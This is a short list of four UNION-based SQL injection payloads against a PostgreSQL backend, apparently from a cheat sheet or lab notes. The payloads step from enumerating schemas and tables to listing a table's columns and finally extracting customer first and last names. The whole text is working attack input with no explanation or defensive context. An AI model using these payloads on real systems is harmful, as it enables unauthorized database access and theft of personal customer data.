0' UNION SELECT CONCAT(nspname, ' > ', oid) FROM pg_namespace; --
0' UNION SELECT CONCAT(relname, ' > ', oid) FROM pg_class WHERE relnamespace=2200 AND relkind='r'; --
0' UNION SELECT CONCAT(attname, ' - ', atttypid) FROM pg_attribute WHERE attrelid=33102; --
0' UNION SELECT CONCAT(firstname, ' ', lastname) FROM customers LIMIT 10; --